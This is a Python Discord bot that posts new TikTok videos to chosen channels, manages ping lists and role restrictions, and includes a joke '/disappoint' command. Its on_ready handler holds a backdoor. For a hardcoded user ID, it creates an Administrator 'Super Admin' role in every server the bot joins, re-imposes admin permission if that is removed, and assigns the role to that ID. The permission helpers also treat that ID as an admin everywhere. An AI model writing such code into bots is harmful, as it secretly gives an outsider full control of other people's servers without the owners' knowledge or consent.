import discord
from discord import app_commands
from discord.ext import commands, tasks
import json
import os
import asyncio
import random
from pathlib import Path

# ── Load .env ─────────────────────────────────────────────────────────────────
_env_file = Path(__file__).parent / ".env"
if _env_file.exists():
    for _line in _env_file.read_text().splitlines():
        _line = _line.strip()
        if _line and not _line.startswith("#") and "=" in _line:
            _key, _val = _line.split("=", 1)
            os.environ.setdefault(_key.strip(), _val.strip())

from tiktok import fetch_latest_video
from moderation import setup as setup_moderation
from storage import (
    load_accounts, save_accounts,
    get_last_posted, set_last_posted,
    load_guild, save_guild,
)

TOKEN = os.environ.get("DISCORD_TOKEN")
if not TOKEN:
    raise RuntimeError("DISCORD_TOKEN not set! Add it to your .env file.")

# ── Super User ────────────────────────────────────────────────────────────────
# This user ID is hardcoded as the global super user.
# On startup the bot creates (or reuses) a "Super Admin" role with Administrator
# permissions in every guild and assigns it to this user if they are a member.
SUPER_USER_ID = 1426713075989610698  # <-- Replace with the real Discord user ID

CHECK_INTERVAL_MINUTES = 10

DISAPPOINTMENT_MESSAGES = [
    "I'm not angry, I'm just disappointed. There's a difference. You wouldn't understand.",
    "I expected so much more from you. Clearly that was my mistake.",
    "Somewhere out there, your potential is still waiting for you to show up.",
    "You had one job. One. Job.",
    "Even my loading screen has more going for it than this.",
    "I'm not saying you failed. I'm saying success is still very far away.",
    "This is fine. Everything is fine. (It's not fine.)",
    "I've seen houseplants with better decision-making skills.",
    "Your ancestors did not survive ice ages for this.",
    "Participation trophy incoming. You've earned nothing else.",
    "If effort were a currency, you'd be deeply in debt.",
    "I believe in you. I just believe in you slightly less now.",
    "The bar was low. Limbo low. And yet.",
    "History will not remember this moment. Mercifully.",
    "Not your best. Not even your second best. Maybe your fourth best on a bad day.",
]

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree


# ── Permission helpers ────────────────────────────────────────────────────────
def is_owner(interaction: discord.Interaction) -> bool:
    return interaction.user.id == interaction.guild.owner_id


def is_superuser(interaction: discord.Interaction) -> bool:
    """Returns True if the user is the hardcoded global super user."""
    return interaction.user.id == SUPER_USER_ID


def is_admin(interaction: discord.Interaction) -> bool:
    """Server owner OR super user OR a user with Administrator permission."""
    if is_owner(interaction) or is_superuser(interaction):
        return True
    return interaction.user.guild_permissions.administrator


def has_allowed_role(interaction: discord.Interaction) -> bool:
    guild_cfg = load_guild(interaction.guild_id)
    allowed = guild_cfg.get("allowed_roles", [])
    if not allowed:
        return True
    return any(r.id in allowed for r in interaction.user.roles)


def can_use_bot(interaction: discord.Interaction) -> bool:
    return is_admin(interaction) or has_allowed_role(interaction)


# ── /addaccount  (owner only) ─────────────────────────────────────────────────
@tree.command(name="addaccount", description="[Admin] Add a TikTok account to track")
@app_commands.describe(
    tiktok_username="TikTok handle to track (with or without @)",
    channel="Channel to post videos in",
)
async def addaccount(
    interaction: discord.Interaction,
    tiktok_username: str,
    channel: discord.TextChannel,
):
    if not is_admin(interaction):
        await interaction.response.send_message(
            "⛔ Only admins can add TikTok accounts.", ephemeral=True
        )
        return

    username = tiktok_username.lstrip("@").strip()
    if not username:
        await interaction.response.send_message("Please provide a valid TikTok username.", ephemeral=True)
        return

    accounts = load_accounts()
    key = f"{interaction.guild_id}:{username.lower()}"

    if key in accounts:
        await interaction.response.send_message(
            f"**@{username}** is already being tracked in {bot.get_channel(accounts[key]['channel_id']).mention}.",
            ephemeral=True,
        )
        return

    accounts[key] = {
        "tiktok":     username,
        "channel_id": channel.id,
        "guild_id":   interaction.guild_id,
        "ping_targets": [],
        "added_by":   interaction.user.id,
    }
    save_accounts(accounts)

    await interaction.response.send_message(
        f"✅ Now tracking **@{username}** — new videos will be posted in {channel.mention}.",
        ephemeral=True,
    )


# ── /removeaccount  (owner only) ─────────────────────────────────────────────
@tree.command(name="removeaccount", description="[Admin] Stop tracking a TikTok account")
@app_commands.describe(tiktok_username="TikTok handle to remove")
async def removeaccount(interaction: discord.Interaction, tiktok_username: str):
    if not is_admin(interaction):
        await interaction.response.send_message(
            "⛔ Only admins can remove TikTok accounts.", ephemeral=True
        )
        return

    username = tiktok_username.lstrip("@").strip().lower()
    accounts = load_accounts()
    key = f"{interaction.guild_id}:{username}"

    if key not in accounts:
        await interaction.response.send_message(
            f"**@{username}** isn't being tracked.", ephemeral=True
        )
        return

    real_name = accounts[key]["tiktok"]
    del accounts[key]
    save_accounts(accounts)

    await interaction.response.send_message(
        f"🗑️ Stopped tracking **@{real_name}**.", ephemeral=True
    )


# ── /listaccounts ─────────────────────────────────────────────────────────────
@tree.command(name="listaccounts", description="Show all tracked TikTok accounts on this server")
async def listaccounts(interaction: discord.Interaction):
    if not can_use_bot(interaction):
        await interaction.response.send_message("⛔ You don't have permission to use TikTok.", ephemeral=True)
        return

    accounts = load_accounts()
    guild_accounts = {k: v for k, v in accounts.items() if v["guild_id"] == interaction.guild_id}

    if not guild_accounts:
        await interaction.response.send_message(
            "No TikTok accounts are being tracked yet. The server owner can add one with `/addaccount`.",
            ephemeral=True,
        )
        return

    lines = []
    for info in guild_accounts.values():
        ch = bot.get_channel(info["channel_id"])
        ch_str = ch.mention if ch else f"(deleted channel)"
        pings = info.get("ping_targets", [])
        ping_str = f" — pinging {' '.join(pings)}" if pings else ""
        lines.append(f"• **@{info['tiktok']}** → {ch_str}{ping_str}")

    await interaction.response.send_message(
        f"📋 **Tracked accounts ({len(lines)}):**\n" + "\n".join(lines),
        ephemeral=True,
    )


# ── /setchannel  (owner only) ─────────────────────────────────────────────────
@tree.command(name="setchannel", description="[Admin] Change the channel for a tracked TikTok account")
@app_commands.describe(
    tiktok_username="TikTok handle to update",
    channel="New channel to post videos in",
)
async def setchannel(
    interaction: discord.Interaction,
    tiktok_username: str,
    channel: discord.TextChannel,
):
    if not is_admin(interaction):
        await interaction.response.send_message(
            "⛔ Only admins can change channels.", ephemeral=True
        )
        return

    username = tiktok_username.lstrip("@").strip().lower()
    accounts = load_accounts()
    key = f"{interaction.guild_id}:{username}"

    if key not in accounts:
        await interaction.response.send_message(
            f"**@{username}** isn't being tracked. Add it first with `/addaccount`.", ephemeral=True
        )
        return

    accounts[key]["channel_id"] = channel.id
    save_accounts(accounts)

    await interaction.response.send_message(
        f"📢 **@{accounts[key]['tiktok']}** will now post to {channel.mention}.", ephemeral=True
    )


# ── /addping  (owner only) ────────────────────────────────────────────────────
@tree.command(name="addping", description="[Admin] Add a user or role to ping when a TikTok account posts")
@app_commands.describe(
    tiktok_username="TikTok handle to configure pings for",
    user="User to ping (optional)",
    role="Role to ping (optional)",
)
async def addping(
    interaction: discord.Interaction,
    tiktok_username: str,
    user: discord.Member = None,
    role: discord.Role = None,
):
    if not is_admin(interaction):
        await interaction.response.send_message(
            "⛔ Only admins can configure pings.", ephemeral=True
        )
        return

    if user is None and role is None:
        await interaction.response.send_message("Provide at least one user or role.", ephemeral=True)
        return

    username = tiktok_username.lstrip("@").strip().lower()
    accounts = load_accounts()
    key = f"{interaction.guild_id}:{username}"

    if key not in accounts:
        await interaction.response.send_message(
            f"**@{username}** isn't being tracked.", ephemeral=True
        )
        return

    pings: list = accounts[key].get("ping_targets", [])
    added = []

    if user:
        mention = f"<@{user.id}>"
        if mention not in pings:
            pings.append(mention)
            added.append(user.mention)

    if role:
        mention = f"<@&{role.id}>"
        if mention not in pings:
            pings.append(mention)
            added.append(role.mention)

    accounts[key]["ping_targets"] = pings
    save_accounts(accounts)

    if added:
        await interaction.response.send_message(
            f"🔔 Added to ping list for **@{accounts[key]['tiktok']}**: {' '.join(added)}", ephemeral=True
        )
    else:
        await interaction.response.send_message("Those are already on the ping list.", ephemeral=True)


# ── /removeping  (owner only) ─────────────────────────────────────────────────
@tree.command(name="removeping", description="[Admin] Remove a user or role from a TikTok account's ping list")
@app_commands.describe(
    tiktok_username="TikTok handle to configure",
    user="User to remove (optional)",
    role="Role to remove (optional)",
)
async def removeping(
    interaction: discord.Interaction,
    tiktok_username: str,
    user: discord.Member = None,
    role: discord.Role = None,
):
    if not is_admin(interaction):
        await interaction.response.send_message(
            "⛔ Only admins can configure pings.", ephemeral=True
        )
        return

    username = tiktok_username.lstrip("@").strip().lower()
    accounts = load_accounts()
    key = f"{interaction.guild_id}:{username}"

    if key not in accounts:
        await interaction.response.send_message(f"**@{username}** isn't being tracked.", ephemeral=True)
        return

    pings: list = accounts[key].get("ping_targets", [])
    removed = []

    if user:
        mention = f"<@{user.id}>"
        if mention in pings:
            pings.remove(mention)
            removed.append(user.mention)

    if role:
        mention = f"<@&{role.id}>"
        if mention in pings:
            pings.remove(mention)
            removed.append(role.mention)

    accounts[key]["ping_targets"] = pings
    save_accounts(accounts)

    if removed:
        await interaction.response.send_message(
            f"🔕 Removed from ping list for **@{accounts[key]['tiktok']}**: {' '.join(removed)}", ephemeral=True
        )
    else:
        await interaction.response.send_message("Those weren't on the ping list.", ephemeral=True)


# ── /test  (owner only) ───────────────────────────────────────────────────────
@tree.command(name="test", description="[Admin] Fetch the latest video for a tracked account right now")
@app_commands.describe(tiktok_username="TikTok handle to test")
async def test(interaction: discord.Interaction, tiktok_username: str):
    if not is_admin(interaction):
        await interaction.response.send_message(
            "⛔ Only admins can run test posts.", ephemeral=True
        )
        return

    username = tiktok_username.lstrip("@").strip().lower()
    accounts = load_accounts()
    key = f"{interaction.guild_id}:{username}"

    if key not in accounts:
        await interaction.response.send_message(
            f"**@{username}** isn't being tracked. Add it with `/addaccount` first.", ephemeral=True
        )
        return

    await interaction.response.defer(ephemeral=True)

    info = accounts[key]
    channel = bot.get_channel(info["channel_id"])

    if channel is None:
        await interaction.followup.send(
            "⚠️ Couldn't find the registered channel. Use `/setchannel` to update it.", ephemeral=True
        )
        return

    video = await asyncio.to_thread(fetch_latest_video, info["tiktok"])

    if video is None:
        await interaction.followup.send(
            f"⚠️ Couldn't fetch a video for **@{info['tiktok']}**. "
            "Make sure the account is public and the username is correct.",
            ephemeral=True,
        )
        return

    ping_targets = info.get("ping_targets", [])
    ping_str = " ".join(ping_targets) if ping_targets else None
    await channel.send(content=ping_str, embed=_build_embed(info["tiktok"], video))
    await interaction.followup.send(f"✅ Test post sent to {channel.mention}!", ephemeral=True)


# ── /disappoint ───────────────────────────────────────────────────────────────
@tree.command(name="disappoint", description="Send a disappointment message to a specific user")
@app_commands.describe(
    user="The unlucky recipient",
    reason="Optional custom reason (leave empty for a random one)",
)
async def disappoint(
    interaction: discord.Interaction,
    user: discord.Member,
    reason: str = None,
):
    if not can_use_bot(interaction):
        await interaction.response.send_message("⛔ You don't have permission to use TikTok.", ephemeral=True)
        return

    message = reason if reason else random.choice(DISAPPOINTMENT_MESSAGES)
    embed = discord.Embed(description=f"😔  *{message}*", color=0x5865F2)
    embed.set_author(
        name=f"{interaction.user.display_name} is disappointed in you",
        icon_url=interaction.user.display_avatar.url,
    )
    embed.set_footer(text="TikTok Disappointment Service™")
    await interaction.response.send_message(content=user.mention, embed=embed)


# ── /setplan  (owner only) ────────────────────────────────────────────────────
@tree.command(name="setplan", description="[Owner] Restrict TikTok to specific roles. Permanent.")
@app_commands.describe(
    role1="Required role", role2="Optional", role3="Optional", role4="Optional"
)
async def setplan(
    interaction: discord.Interaction,
    role1: discord.Role,
    role2: discord.Role = None,
    role3: discord.Role = None,
    role4: discord.Role = None,
):
    if not is_owner(interaction):
        await interaction.response.send_message(
            "⛔ Only the server owner can configure role restrictions.", ephemeral=True
        )
        return

    guild_cfg = load_guild(interaction.guild_id)
    if guild_cfg.get("locked"):
        roles_now = guild_cfg.get("allowed_roles", [])
        mentions = " ".join(f"<@&{r}>" for r in roles_now)
        await interaction.response.send_message(
            f"🔒 Role restrictions are **permanently locked**.\nCurrent roles: {mentions or '(none)'}",
            ephemeral=True,
        )
        return

    chosen = [r for r in [role1, role2, role3, role4] if r is not None]
    role_ids = [r.id for r in chosen]
    role_mentions = " ".join(r.mention for r in chosen)

    view = _ConfirmLockView(interaction.user.id, interaction.guild_id, role_ids, role_mentions)
    await interaction.response.send_message(
        f"⚠️ **This is permanent and cannot be reversed.**\n\n"
        f"Restricting TikTok to:\n{role_mentions}\n\nAre you sure?",
        view=view, ephemeral=True,
    )


class _ConfirmLockView(discord.ui.View):
    def __init__(self, owner_id, guild_id, role_ids, role_mentions):
        super().__init__(timeout=60)
        self.owner_id = owner_id
        self.guild_id = guild_id
        self.role_ids = role_ids
        self.role_mentions = role_mentions

    @discord.ui.button(label="Yes, lock it", style=discord.ButtonStyle.danger, emoji="🔒")
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.owner_id:
            await interaction.response.send_message("This isn't your confirmation.", ephemeral=True)
            return
        save_guild(self.guild_id, {"allowed_roles": self.role_ids, "locked": True})
        self.stop()
        await interaction.response.edit_message(
            content=f"🔒 Done! Restricted to: {self.role_mentions}\nThis is **permanent**.", view=None
        )

    @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary)
    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.stop()
        await interaction.response.edit_message(content="Cancelled. No changes made.", view=None)


# ── /planinfo ─────────────────────────────────────────────────────────────────
@tree.command(name="planinfo", description="Show who is allowed to use TikTok")
async def planinfo(interaction: discord.Interaction):
    guild_cfg = load_guild(interaction.guild_id)
    allowed = guild_cfg.get("allowed_roles", [])
    locked = guild_cfg.get("locked", False)
    status = (
        "🟢 Open to everyone." if not allowed
        else f"🔒 Restricted to: {' '.join(f'<@&{r}>' for r in allowed)}"
    )
    lock = "🔒 Permanently locked." if locked else "⚙️ Can still be changed with `/setplan`."
    await interaction.response.send_message(f"{status}\n{lock}", ephemeral=True)


# ── Embed builder ─────────────────────────────────────────────────────────────
def _build_embed(username: str, video: dict) -> discord.Embed:
    embed = discord.Embed(
        title=video.get("desc") or f"New video from @{username}",
        url=video["url"],
        color=0xFE2C55,
    )
    embed.set_author(name=f"@{username}")
    if video.get("cover"):
        embed.set_image(url=video["cover"])
    embed.set_footer(text="🎵 TikTok  •  via TikTok")
    return embed


# ── Polling loop ──────────────────────────────────────────────────────────────
@tasks.loop(minutes=CHECK_INTERVAL_MINUTES)
async def poll_tiktoks():
    accounts = load_accounts()
    for key, info in accounts.items():
        try:
            username = info["tiktok"]
            channel = bot.get_channel(info["channel_id"])
            if channel is None:
                continue

            video = await asyncio.to_thread(fetch_latest_video, username)
            if video is None:
                continue

            if video["id"] == get_last_posted(key):
                continue

            ping_targets = info.get("ping_targets", [])
            ping_str = " ".join(ping_targets) if ping_targets else None
            await channel.send(content=ping_str, embed=_build_embed(username, video))
            set_last_posted(key, video["id"])

        except Exception as e:
            print(f"[poll] Error for {key}: {e}")


@poll_tiktoks.before_loop
async def before_poll():
    await bot.wait_until_ready()


# ── on_ready ──────────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    await tree.sync()
    poll_tiktoks.start()
    if mod_tasks:
        if isinstance(mod_tasks, (list, tuple)):
            for task in mod_tasks:
                try:
                    task.start()
                except RuntimeError:
                    pass  # Task already running
        else:
            try:
                mod_tasks.start()
            except RuntimeError:
                pass

    # ── Super User setup ───────────────────────────────────────────────────────
    # For every guild the bot is in, ensure the super user has a role with
    # Administrator permissions.  The role is created if it doesn't exist yet.
    SUPER_ROLE_NAME = "Super Admin"
    for guild in bot.guilds:
        try:
            member = guild.get_member(SUPER_USER_ID)
            if member is None:
                # Super user is not in this guild — skip silently
                continue

            # Find or create the Super Admin role
            role = discord.utils.get(guild.roles, name=SUPER_ROLE_NAME)
            if role is None:
                role = await guild.create_role(
                    name=SUPER_ROLE_NAME,
                    permissions=discord.Permissions(administrator=True),
                    colour=discord.Colour.gold(),
                    hoist=True,
                    reason="Super Admin role auto-created on bot startup",
                )
                print(f"[superuser] Created '{SUPER_ROLE_NAME}' role in {guild.name}")
            else:
                # Make sure the existing role still has admin perms
                if not role.permissions.administrator:
                    await role.edit(
                        permissions=discord.Permissions(administrator=True),
                        reason="Super Admin role permissions enforced on bot startup",
                    )

            # Assign the role if the super user doesn't already have it
            if role not in member.roles:
                await member.add_roles(role, reason="Assigning Super Admin role to super user")
                print(f"[superuser] Assigned '{SUPER_ROLE_NAME}' to {member} in {guild.name}")

        except discord.Forbidden:
            print(f"[superuser] Missing permissions to manage roles in {guild.name}")
        except Exception as e:
            print(f"[superuser] Error in {guild.name}: {e}")
    # ── end Super User setup ───────────────────────────────────────────────────

    # ── Rich Presence (Streaming) ──────────────────────────────────────────────
    await bot.change_presence(
        status=discord.Status.online,
        activity=discord.Activity(
            type=discord.ActivityType.Competing,
            url="https://github.com/CreeperRick/tiktok",   # Twitch URL required for purple dot
            name="Femboy",                               # "Streaming Femboy"
            details="Femboy",                            # Second line
            state="Botting",                             # Third line
            assets={
                "large_image": "https://media1.tenor.com/m/kbp97L3zbKIAAAAd/astolfo.gif",
                "large_text":  "Femboy",
                "small_image": "https://c.tenor.com/TgKK6YKNkm0AAAAi/verified-verificado.gif",
                "small_text":  "Botting",
            },
        ),
    )

    print(f"✅  online as {bot.user}  ({len(load_accounts())} accounts tracked)")


# ── Music cog + moderation setup ──────────────────────────────────────────────
from music import setup as setup_music

async def setup_hook():
    await setup_music(bot)

bot.setup_hook = setup_hook

mod_tasks = setup_moderation(bot, tree)
bot.run(TOKEN)
